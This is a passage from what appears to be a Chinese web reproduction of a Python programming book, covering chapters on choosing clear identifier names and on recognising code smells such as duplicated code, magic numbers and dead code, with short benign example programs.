值得一提的还有<code>.</code>文件夹和<code>..</code>文件夹，它们并非真正的文件夹，而是可以在路径中使用的特殊标记符。一个点（<code>.</code>）指代当前目录，两个点（<code>..</code>）指代父目录。</p><h1 id="第-4-章-选择易懂的名称"><a href="#第-4-章-选择易懂的名称" class="headerlink" title="第 4 章　选择易懂的名称"></a>第 4 章　选择易懂的名称</h1><blockquote><p>“计算机科学中有两大难题：命名、缓存失效和差一错误。”这个经典笑话是Leon Bambrick根据Phil Karlton说的话改编的，它揭示了一个真理——为变量、函数、类等编程中的元素起名（正式的说法叫作标识符）很难。简洁而有描述意义的名称能够大大提升程序代码的可读性。</p></blockquote><p>　　但是起名字说起来容易做起来难。假如你要搬家，把粘贴在所有包装箱上的标签写成“物品”虽然很简洁，但不具备描述性。而将一本编程书起名为《用Python发明你自己的计算机游戏》虽然具备了描述性，但又太过啰唆。</p><p>　　除非编写的代码是“一次性”的，仅需运行一次，不需要长期维护，否则应该在命名这件事上花些工夫。如果只是简单地用<code>a</code>、<code>b</code>、<code>c</code>作为变量名，将来会花费不必要的心力回忆当初这些变量的作用。</p><p>　　命名是必须要做的一个主观选择，而自动格式化工具（比如第3章介绍的Black）无法为变量起名。本章提供了一些指导原则，帮助你选择好的名字，规避糟糕的名字。当然，这些原则并非金规铁律，你可以根据自己的判断决定什么时候应用它们。</p><h2 id="4-1-命名风格"><a href="#4-1-命名风格" class="headerlink" title="4.1　命名风格"></a>4.1　命名风格</h2><p>Python的标识符区分大小写，且不能包含空格。当标识符中存在多个单词时，程序员可以应用以下几种命名风格。</p><ul><li>蛇形命名法（<code>snake_case</code>）：用下划线分隔单词，两个单词之间的连接看起来像蛇一样。这种情况下，所有字母都是小写的，但常量名经常采用大写，类似于<code>UPPER_SNAKE_CASE</code>。</li><li>驼峰命名法（<code>camelCase</code>）：从第二个单词开始，每个单词使用首字母大写进行分隔。也就是说，第一个单词首字母小写，后面的单词的大写字母看起来像驼峰。</li><li>Pascal命名法（<code>PascalCase</code>）：因其在Pascal编程语言中的使用而得名。它跟驼峰命名法类似，但第一个单词的首字母也要大写。</li></ul><p>　　最常见的是蛇形命名法和驼峰命名法。选择哪一种都无关紧要，只要不在项目中混用就好。</p><h2 id="4-2-PEP-8的命名风格"><a href="#4-2-PEP-8的命名风格" class="headerlink" title="4.2　PEP 8的命名风格"></a>4.2　PEP 8的命名风格</h2><p>第3章中介绍的PEP 8文档对Python的命名规则提出了一些建议。</p><ul><li>所有的字母应是ASCII字母，也就是没有重音符号的大写和小写的英文字母。</li><li>模块名应该简短，都是小写字母。</li><li>类名应使用Pascal命名法。</li><li>常量名应使用大写字母的蛇形命名法。</li><li>函数名、方法名和变量名应使用小写字母的蛇形命名法。</li><li>方法的第一个参数应总是命名为小写的<code>self</code>。</li><li>类方法的第一个参数应总是命名为小写的<code>cls</code>。</li><li>类中的私有属性应总是以下划线（<code>_</code>）开头。</li><li>类中的公共属性不应以下划线（<code>_</code>）开头。</li></ul><h2 id="4-3-适当的名称长度"><a href="#4-3-适当的名称长度" class="headerlink" title="4.3　适当的名称长度"></a>4.3　适当的名称长度</h2><p>显然，名称的长度应该适中。长的变量名输入起来很麻烦，短的变量名则可能让人产生困惑。因为代码被阅读的次数比被编写的次数要多，所以相比之下，宁愿名称偏长也不要偏短。下面将列举一些名称太短或者太长的例子。</p><h3 id="4-3-1-太短的名称"><a href="#4-3-1-太短的名称" class="headerlink" title="4.3.1　太短的名称"></a>4.3.1　太短的名称</h3><p>最常见的命名错误是选择太短的名称。在刚起名的时候，你还能记得住短名称的含义，几天或者几周后可能就记不起来了。短名称有以下几种常见类型。</p><ul><li>名称为一个或两个字母，像是<code>g</code>，本意是用来指代以<code>g</code>开头的某个单词，但这样的单词太多了。只有一两个字母的首字母略缩词对写代码的人而言很省事，但对别人而言很难读懂。</li><li>缩写名称比如<code>mon</code>，可以用来代表监视器、月份、怪物等单词。</li><li>单个词语像是<code>start</code>，意思比较模糊——是什么的开始？此类名称可能是其他人在阅读时没有注意到的与上下文相关的隐含意思。</li></ul><p>　　一个或两个字母、缩写、单个词语对你而言可能好理解，但请始终牢记，其他程序员（甚至是几周后的自己）很难理解它们的含义。</p><p>　　有些例外情况可以采用简短的变量名。例如使用<code>for</code>循环遍历数字范围或表示列表的索引时，通常会使用<code>i</code>（index的缩写，指代索引）作为变量名。如果出现嵌套循环，会依此使用<code>j</code>、<code>k</code>（因为在字母序列中，j和k排在i之后）：</p><p><strong>DN’T DRP LTTRS FRM YR SRC CD</strong></p><p>Don’t drop letters from your source code（不要从源代码中删减某些字母）。尽管像是<code>memcpy</code>（memory copy）和<code>strcmp</code>（string compare）这种删减字母的写法在20世纪90年代前的C语言中很流行，但如今它们被视为不可读的命名风格，不该再被使用。这类不容易发音的名称很难被理解。</p><p>　　此外，可以大胆使用通俗易懂的英语短语作为代码文字，比如<code>number_of_trials</code>就比仅仅写成<code>number_trials</code>更具可读性。</p><h3 id="4-3-2-太长的名称"><a href="#4-3-2-太长的名称" class="headerlink" title="4.3.2　太长的名称"></a>4.3.2　太长的名称</h3><p>名称越长，描述性通常也越强。像<code>payment</code>这样的短名称在单一、较短的函数中作为局部变量是不错的。但如果是作为一个长达10 000行的程序中的全局变量，那<code>payment</code>的描述性就不太够了，因为这样一个庞大的程序可能会处理多种支付数据。一个更具描述性的名称，比如<code>salesClientMonthlyPayment</code>或<code>annual_electric_bill_payment</code>可能更合适。名称中的附加词提供了更多的语境信息，可以避免歧义。过度描述总比不描述要好。这里提供了一些用于判断名称是否过长的准则。</p><ol><li><p><strong>名称中的前缀</strong></p><p>在名称中使用常见的前缀可能会提供不必要呈现的细节信息。对于类的特性名称而言，前缀可能会提供不需要在变量名中出现的信息。比如一个包含重量特性的猫的类，显然重量指的就是猫的体重。因此<code>catWeight</code>这个名称就显得描述性过强，且过长。</p><p>同样，一个过时的做法是使用匈牙利命名法，也就是在名称中包含数据类型缩写的做法。例如<code>strName</code>这个名称表明变量类型是字符串，而<code>iVacationDays</code>表明变量类型是整数。现代编程语言和IDE可以向程序员传达数据类型信息，不再需要这些前缀，这使得匈牙利命名法如今已经没有使用的必要性。所以，如果名称中有数据类型前缀，还请删除。</p><p>对于包含布尔值的变量或者返回布尔值的函数和方法，<code>is</code>和<code>has</code>前缀能够增强名称的可读性。思考以下使用名为<code>is_vehicle</code>的变量和名为<code>has_key()</code>的方法：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">if item_under_repair.has_key(&#x27;tires&#x27;):<br>  is_vehicle = True<br><br></code></pre></td></tr></table></figure><p><code>has_key()</code>方法和<code>is_vehicle</code>变量可以帮助读者对代码进行通俗的英文解读：“如果被修理的物品有一个名为轮胎的属性，那么该物品就是一辆车。”</p><p>同样，在名称中加入计量单位可以提供有用的信息。一个存储浮点数的重量变量会存在歧义：重量的单位是磅、公斤，还是吨？计量单位信息不是上文所说的数据类型，所以包含<code>kg</code>、<code>lbs</code>、<code>tons</code>的前缀或者后缀并不同于匈牙利命名法。如果没有使用包含单位信息的特定重量的数据类型，可将变量命名为<code>weight_kg</code>之类的名称，这样做可能更慎重一些。事实上，由于1999年洛克希德·马丁公司提供的软件使用了英制标准单位的计算结果，而NASA系统使用的是公制计量单位，因此数据换算错误导致了轨道错误，造成火星气候轨道飞行器丢失。据报道，该航天器的造价高达1.25亿美元。</p></li><li><p><strong>名称中的连续数字后缀</strong></p><p>名称中的连续数字后缀表明可能需要改变变量的数据类型，或者在名称中添加不同的细节描述。单纯的数字往往不能提供足够的信息来区别这些名称。</p><p>像<code>payment1</code>、<code>payment2</code>、<code>payment3</code>这样的变量名称并没有告诉你这些值之间的区别。也许这3个变量名应该被重构为一个名为<code>payments</code>的变量，包含3个值的列表或者元组。</p><p>像<code>makePayment1(amount)</code>、<code>makePayment2(amount)</code>这样的函数也许该被重构为接受整数参数的单个函数：<code>makePayment(1, amount)</code>、<code>makePayment(2, amount)</code>等。如果这些函数的行为是不同的，确实要使用不同的函数，则应该在名称中说明数字背后的意义，例如<code>makeLowPriorityPayment(amount)</code>和<code>makeHighPriorityPayment(amount)</code>，或<code>make1stQuarterPayment(amount)</code>和<code>make2ndQuarterPayment(amount)</code>。</p><p>如果有充分的理由选择带有连续数字后缀的名称，也并非不可以。但是，如果仅仅是因为偷懒，还请慎重考虑。</p></li></ol><h2 id="4-4-起易于搜索的名称"><a href="#4-4-起易于搜索的名称" class="headerlink" title="4.4　起易于搜索的名称"></a>4.4　起易于搜索的名称</h2><p>　　除非是非常小的程序，否则可能需要使用编辑器或者IDE的CTRL-F查找功能来定位变量或者函数被引用的位置。如果变量名较短且常见，比如<code>num</code>或<code>a</code>，那么会得到很多错误的匹配。为了能快速搜索，请使用包含具体细节的较长且特殊的名称。</p><p>　　一些IDE带有重构功能，可以根据程序对变量的使用方式识别不同的名称。比如，一个常见的功能是重命名工具，它可以区分名为<code>num</code>和<code>number</code>的变量，以及局部变量<code>num</code>和全局变量<code>num</code>。但起名字时不要想着依赖这些工具。</p><p>　　牢记这一原则可以帮助你挑选描述性强的名称，而非常见的名称。<code>email</code>这个名称过于模糊，所以应该考虑更具描述性的名称，比如<code>emailAddress</code>、<code>downloadEmailAttachment</code>、<code>emailMessage</code>或<code>replyToAddress</code>。这样的名称不仅更准确，而且在源代码文件中也更容易被搜到。</p><h2 id="4-5-避免笑话、双关语和需要文化背景才能理解的词汇"><a href="#4-5-避免笑话、双关语和需要文化背景才能理解的词汇" class="headerlink" title="4.5　避免笑话、双关语和需要文化背景才能理解的词汇"></a>4.5　避免笑话、双关语和需要文化背景才能理解的词汇</h2><h2 id="4-6-不要覆盖内置名称"><a href="#4-6-不要覆盖内置名称" class="headerlink" title="4.6　不要覆盖内置名称"></a>4.6　不要覆盖内置名称</h2><p>一些常被覆盖的Python名称有：<code>all</code>、<code>any</code>、<code>date</code>、<code>email</code>、<code>file</code>、<code>format</code>、<code>hash</code>、<code>id</code>、<code>input</code>、<code>list</code>、<code>min</code>、<code>max</code>、<code>object</code>、<code>open</code>、<code>random</code>、<code>set</code>、<code>str</code>、<code>sum</code>、<code>test</code>和<code>type</code>。不要使用这些名称作为标识符。</p><p>　　<code>data</code>是一个糟糕的变量名，因为所有变量都包含数据。给变量命名为<code>var</code>也是一样，这好比你给宠物狗起名叫“狗”。<code>temp</code>这个名称对于临时持有数据的变量而言很常见，但这也非良选。毕竟从某种角度来看，所有的变量都是临时的。遗憾的是，尽管这些命名含糊不清，但还是经常出现。请不要在代码中使用它们了。</p><p>　　当需要一个变量来保存温度数据的统计方差时，请使用<code>temperatureVariance</code>这个名称。毫无疑问，<code>tempVarData</code>不是一个好选择。</p><h2 id="4-8-小结"><a href="#4-8-小结" class="headerlink" title="4.8　小结"></a>4.8　小结</h2><p>　　命名与算法或者计算机科学无关，但它是能否编写可读代码的一个重要因素。代码中使用什么名称的最终决定权在你手里，但要注意现有的一些准则。PEP 8文档推荐了几个命名规则，比如模块的名称用小写，类的名称用Pascal命名法。名称长度应该适中。通常情况下，宁愿提供过多描述性信息，也不要信息过少。</p><p>　　名称应当简洁，但要兼具描述性。能否使用CTRL-F搜索功能快速找到某个名称是衡量它是否具备特殊性和描述性的标志。想一想你起的名称便于搜索的程度，这可以帮助你判断是否使用了太过常见的名称。此外，还要考虑英语不流利的程序员能否理解这个名称。避免在名称中使用笑话、双关语和需要有文化背景知识才能理解的词汇，而是要选择礼貌、直接、不搞怪的名称。</p><p>　　尽管本章的许多建议只是推荐做法，但应该避免使用Python标准库已经使用过的名称，比如<code>all</code>、<code>any</code>、<code>date</code>、<code>email</code>、<code>file</code>、<code>format</code>、<code>hash</code>、<code>id</code>、<code>input</code>、<code>list</code>、<code>min</code>、<code>max</code>、<code>object</code>、<code>open</code>、<code>random</code>、<code>set</code>、<code>str</code>、<code>sum</code>、<code>test</code>和<code>type</code>。使用这些名称可能导致代码中出现难以定位的错误。</p><p>　　计算机并不在乎名称是言简意赅还是语焉不详。名称的作用是让人更容易阅读，而不是让计算机更容易运行。如果代码的可读性很强，就很容易被理解；如果容易被理解，那就容易进行修改；如果容易修改，那就意味着容易修复错误或者增加新功能。所以，使用可理解的名称是生产高质量软件的前提。</p><h1 id="第-5-章-揪出代码的坏味道"><a href="#第-5-章-揪出代码的坏味道" class="headerlink" title="第 5 章　揪出代码的坏味道"></a>第 5 章　揪出代码的坏味道</h1><blockquote><p>导致程序崩溃的代码显然是错了，但崩溃并不是衡量程序问题的唯一指标。其他迹象也会表明程序中存在着难以察觉的漏洞或者不可读的代码。就像嗅到的一股怪味儿告诉你煤气可能正在泄漏，闻到的烟味儿提示你哪里着火了一样，代码的坏味道指的是一种揭示潜在问题的代码模式。这种坏味道并不意味着一定存在问题，但它说明该是检查程序的时候了。</p></blockquote><p>　　本章列举了几种常见的代码坏味道。预防错误花费的时间和精力要比遇到错误、理解错误然后修复错误少得多。每个程序员都曾碰上过这样的事情：花了几小时调试来调试去，最终发现只需要修改一行代码就可以修复。出于这个原因，即使遇到一点儿潜在的错误，你也应该停下来，仔细检查是否在为未来的工作“挖坑”。</p><p>　　当然，代码的坏味道不一定都是问题。究竟是处理还是忽略要依靠你自己的判断。</p><h2 id="5-1-重复的代码"><a href="#5-1-重复的代码" class="headerlink" title="5.1　重复的代码"></a>5.1　重复的代码</h2><p>　最常见的代码坏味道是重复的代码。重复的代码是指通过在程序中复制粘贴产生的源代码。例如下面这个简短的程序中就包含了重复的代码，它询问了3次用户的感觉如何：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs shell">print(&#x27;Good morning!&#x27;)<br>print(&#x27;How are you feeling?&#x27;)<br>feeling = input()<br>print(&#x27;I am happy to hear that you are feeling &#x27; + feeling + &#x27;.&#x27;)<br>print(&#x27;Good afternoon!&#x27;)<br>print(&#x27;How are you feeling?&#x27;)<br>feeling = input()<br>print(&#x27;I am happy to hear that you are feeling &#x27; + feeling + &#x27;.&#x27;)<br>print(&#x27;Good evening!&#x27;)<br>print(&#x27;How are you feeling?&#x27;)<br>feeling = input()<br>print(&#x27;I am happy to hear that you are feeling &#x27; + feeling + &#x27;.&#x27;)<br></code></pre></td></tr></table></figure><p>解决重复代码的方法是去重，简单地说，通过把代码放在一个函数或者循环中，使其在代码中只出现一次。在下面的示例中，重复代码被移动到一个函数中，通过反复调用函数以达到同样的效果：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell">def askFeeling():<br>    print(&#x27;How are you feeling?&#x27;)<br>    feeling = input()<br>    print(&#x27;I am happy to hear that you are feeling &#x27; + feeling + &#x27;.&#x27;)<br><br>print(&#x27;Good morning!&#x27;)<br>askFeeling()<br>print(&#x27;Good afternoon!&#x27;)<br>askFeeling()<br>print(&#x27;Good evening!&#x27;)<br>askFeeling()<br></code></pre></td></tr></table></figure><h2 id="5-2-魔数"><a href="#5-2-魔数" class="headerlink" title="5.2　魔数"></a>5.2　魔数</h2><p>程序包含数字很正常，但代码中出现的一些数字可能会让其他程序员（或者几周前写下这串数字的你）感到困惑。例如接下来这行代码中的数字604800：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">expiration = time.time() + <span class="hljs-number">604800</span><br></code></pre></td></tr></table></figure><p><code>time.time()</code>函数返回一个代表当前时间的整数。猜得出来，<code>expiration</code>变量代表的是未来的某个时间点。但<code>604800</code>相当神秘：这个过期日期的意义是什么？可以添加一行注释进行解释：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">expiration = time.time() + <span class="hljs-number">604800</span> <span class="hljs-comment"># 一周后过期</span><br></code></pre></td></tr></table></figure><p>这个写法是可行的，但更好的做法是使用常量代替这些“神奇”的数字。常量是一类用大写字母书写的量，其数值在初始赋值后不应该改变。通常，在源代码文件的顶部来定义作为全局变量的常量：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 设置不同时间量的常量：</span><br>SECONDS_PER_MINUTE = <span class="hljs-number">60</span><br>SECONDS_PER_HOUR   = <span class="hljs-number">60</span> * SECONDS_PER_MINUTE<br>SECONDS_PER_DAY    = <span class="hljs-number">24</span> * SECONDS_PER_HOUR<br>SECONDS_PER_WEEK   = <span class="hljs-number">7</span>  * SECONDS_PER_DAY<br><br>--snip--<br><br>expiration = time.time() + SECONDS_PER_WEEK <span class="hljs-comment"># 一周后过期</span><br></code></pre></td></tr></table></figure><p>即使数值相同，也应该为有着不同目的的魔数采用不同的常量。比如一副扑克牌有52张，一年也有52周。但如果程序中同时存在这两种量，那么正确的做法应该是：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">NUM_CARDS_IN_DECK = <span class="hljs-number">52</span><br>NUM_WEEKS_IN_YEAR = <span class="hljs-number">52</span><br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;This deck contains&#x27;</span>, NUM_CARDS_IN_DECK, <span class="hljs-string">&#x27;cards.&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;The 2-year contract lasts for&#x27;</span>, <span class="hljs-number">2</span> * NUM_WEEKS_IN_YEAR, <span class="hljs-string">&#x27;weeks.&#x27;</span>)<br></code></pre></td></tr></table></figure><p>这段代码运行后的输出是：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">This deck contains <span class="hljs-number">52</span> cards.<br>The <span class="hljs-number">2</span>-year contract lasts <span class="hljs-keyword">for</span> <span class="hljs-number">104</span> weeks.<br></code></pre></td></tr></table></figure><p>　　使用不同的常量有利于将来对它们进行独立的修改。注意，在程序运行时不应该改变常量的数值，但这不意味着程序员不能在代码中对常量进行更新。比如，当代码的未来某个版本中只有一张小丑牌<strong>1</strong>时，只需要改变扑克牌数量的常量，而不影响周数量的常量：</p><p><strong>1</strong>也叫作小王牌。——译者注</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">NUM_CARDS_IN_DECK = <span class="hljs-number">53</span><br>NUM_WEEKS_IN_YEAR = <span class="hljs-number">52</span><br></code></pre></td></tr></table></figure><p>　　<strong>魔数</strong>这个术语也可以用来指代非数字值，比如，你也许使用字符串类型的值作为常量。下面这个程序要求用户输入一个方向，如果方向是“north”则显示一个警告。“north”被错误拼写成“nrth”导致了一个bug，使程序无法显示警告：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Set solar panel direction:&#x27;</span>)<br>    direction = <span class="hljs-built_in">input</span>().lower()<br>    <span class="hljs-keyword">if</span> direction <span class="hljs-keyword">in</span> (<span class="hljs-string">&#x27;north&#x27;</span>, <span class="hljs-string">&#x27;south&#x27;</span>, <span class="hljs-string">&#x27;east&#x27;</span>, <span class="hljs-string">&#x27;west&#x27;</span>):<br>        <span class="hljs-keyword">break</span><br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Solar panel heading set to:&#x27;</span>, direction)<br><span class="hljs-keyword">if</span> direction == <span class="hljs-string">&#x27;nrth&#x27;</span>: ❶<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Warning: Facing north is inefficient for this panel.&#x27;</span>)<br></code></pre></td></tr></table></figure><p>　　这个bug可能很难被发现：错误的拼写“nrth”❶在Python语法中仍然是一个正确的字符串，程序不会崩溃，也没有警示信息，让人难以察觉。但如果我们使用常量，错误拼写就会导致程序崩溃，因为Python会注意到<code>NRTH</code>常量并不存在：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 为每个基本方向设置常量：</span><br>NORTH = <span class="hljs-string">&#x27;north&#x27;</span><br>SOUTH = <span class="hljs-string">&#x27;south&#x27;</span><br>EAST = <span class="hljs-string">&#x27;east&#x27;</span><br>WEST = <span class="hljs-string">&#x27;west&#x27;</span><br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Set solar panel direction:&#x27;</span>)<br>    direction = <span class="hljs-built_in">input</span>().lower()<br>    <span class="hljs-keyword">if</span> direction <span class="hljs-keyword">in</span> (NORTH, SOUTH, EAST, WEST):<br>        <span class="hljs-keyword">break</span><br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Solar panel heading set to:&#x27;</span>, direction)<br><span class="hljs-keyword">if</span> direction == NRTH: ❶<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Warning: Facing north is inefficient for this panel.&#x27;</span>)<br></code></pre></td></tr></table></figure><p>　　运行代码时，带有<code>NRTH</code>错误❶的代码行抛出了<code>NameError</code>，错误会被立刻展示出来：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-type">Set</span> solar panel direction:<br>west<br>Solar panel heading <span class="hljs-built_in">set</span> to: west<br>Traceback (most recent call last):<br>  File <span class="hljs-string">&quot;panelset.py&quot;</span>, line <span class="hljs-number">14</span>, <span class="hljs-keyword">in</span> &lt;module&gt;<br>    <span class="hljs-keyword">if</span> direction == NRTH:<br>NameError: name <span class="hljs-string">&#x27;NRTH&#x27;</span> <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> defined<br></code></pre></td></tr></table></figure><p>　　魔数是一种代码的坏味道，因为它们没有表明数字的目的，降低了代码的可读性，使其难以维护，而且容易出现难以察觉的拼写错误。解决方法是使用常量替代魔数。</p><h2 id="5-3-注释掉的代码和死代码"><a href="#5-3-注释掉的代码和死代码" class="headerlink" title="5.3　注释掉的代码和死代码"></a>5.3　注释掉的代码和死代码</h2><p>用注释掉代码的方法使代码不能运行，这作为临时手段是可行的。你可能想跳过一些代码行来测试其他功能，而注释掉代码的好处在于之后容易找到并恢复它们。但如果注释掉的代码一直保留着，后面阅读代码的人就会困惑为什么要删除这段代码，什么情况下会再使用它。请看下面这个示例：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">doSomething</span><span class="hljs-params">()</span></span><br><span class="hljs-selector-id">#doAnotherThing</span>()<br><span class="hljs-function"><span class="hljs-title">doSomeImportantTask</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">doAnotherThing</span><span class="hljs-params">()</span></span><br></code></pre></td></tr></table></figure><p>　　这段代码让人产生很多疑惑：为什么<code>doAnotherThing()</code>被注释掉了？还能再加入它吗？为什么<code>doAnotherThing()</code>的第2次调用没有被注释掉？是原本就有两次<code>doAnotherThing()</code>调用，还是最初只有一次调用，后来被移到<code>doSomeImportantTask()</code>之后了？不删除注释掉的代码是有什么原因吗？这些疑惑没有得到解答。</p><p>　　死代码是指无法到达或者逻辑上永远无法运行的代码。比如，函数中返回语句之后的代码，在条件永远为假的<code>if</code>语句块中的代码，或者从未被调用的函数代码。在交互式shell中输入以下内容看一下：</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-keyword">import</span> random</span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">coinFlip</span>():</span><br><span class="hljs-meta prompt_">...</span> <span class="language-python">    <span class="hljs-keyword">if</span> random.randint(<span class="hljs-number">0</span>, <span class="hljs-number">1</span>):</span><br><span class="hljs-meta prompt_">...</span> <span class="language-python">        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Heads!&#x27;</span></span><br><span class="hljs-meta prompt_">...</span> <span class="language-python">    <span class="hljs-keyword">else</span>:</span><br><span class="hljs-meta prompt_">...</span> <span class="language-python">        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Tails!&#x27;</span></span><br><span class="hljs-meta prompt_">...</span> <span class="language-python">    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;The coin landed on its edge!&#x27;</span></span><br><span class="hljs-meta prompt_">...</span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-built_in">print</span>(coinFlip())</span><br>Tails!<br></code></pre></td></tr></table></figure><p>　　<code>return &#39;The coin landed on its edge!&#39;</code>这一行是死代码，因为代码在<code>if</code>和<code>else</code>块中就已经返回了。死代码具有误导性，程序员在阅读时会认为它们是程序中的有效部分，但实际上它们和注释掉的代码无异。</p><p>　　桩代码是上述代码的坏味道规则的一个例外。它们是一些未来出现的代码的占位符，比如尚未实现的函数或者类。为了代替真正的代码，桩代码包含一个<code>pass</code>语句，它什么也不做（也被称为no operation或者no-op）。<code>pass</code>语句存在的意义是对在语法上需要有代码的地方打桩：</p><h2 id="5-5-带有数字后缀的变量"><a href="#5-5-带有数字后缀的变量" class="headerlink" title="5.5　带有数字后缀的变量"></a>5.5　带有数字后缀的变量</h2><p>在编写程序时，偶尔需要存储多个相同数据类型的变量，你可能想通过添加数字后缀来重复使用一个变量名。比如在处理一个要求用户输入两次密码以防打错字的注册表单时，你可能会将这些密码字符串存储在名为<code>password1</code>和<code>password2</code>的变量中。这些数字后缀并不能很好地描述这些变量所包含的内容以及它们之间的差异。它们也没有说明这类变量究竟有多少个，是否还有<code>password3</code>或<code>password4</code>？请尝试创建特殊的名称，而不是仅仅添加数字后缀。对于这两个密码命名的例子而言，更好的变量名是<code>password</code>和<code>confirm_password</code>。</p><p>　　再来看另外一个例子，假设有一个处理起点坐标和终点坐标的函数，参数可能会被命名为<code>x1</code>、<code>x2</code>、<code>y1</code>和<code>y2</code>。但数字后缀的名字并不像<code>start_x</code>、<code>start_y</code>、<code>end_x</code>、<code>end_y</code>这些名字那样能传达很多信息。与<code>x1</code>和<code>y1</code>相比，<code>start_x</code>和<code>start_y</code>这两个变量之间的关系更明显。如果数字后缀超过了2，可能需要使用列表或者set数据结构将数据存储为一个集合。比如可以将<code>pet1Name</code>、<code>pet2Name</code>、<code>pet3Name</code>的值存储在一个名为<code>petNames</code>的列表中。</p><p>　　这种代码的坏味道并不能简单地套用在每个以数字结尾的变量上。比如名为<code>enableIPv6</code>的变量是完全可取的，因为6是<code>IPv6</code>本名的一部分，而非一个数字后缀。但如果在一系列的变量中使用数字后缀，那么可以考虑用某种数据结构代替它们，比如列表或字典。</p><h2 id="5-6-本该是函数或者模块的类"><a href="#5-6-本该是函数或者模块的类" class="headerlink" title="5.6　本该是函数或者模块的类"></a>5.6　本该是函数或者模块的类</h2><p>使用Java等语言的程序员习惯通过创建类来组织代码。例如示例中的<code>Dice</code>类，包含一个<code>roll()</code>方法：</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-keyword">import</span> random</span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Dice</span>:</span><br><span class="hljs-meta prompt_">...</span> <span class="language-python">    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, sides=<span 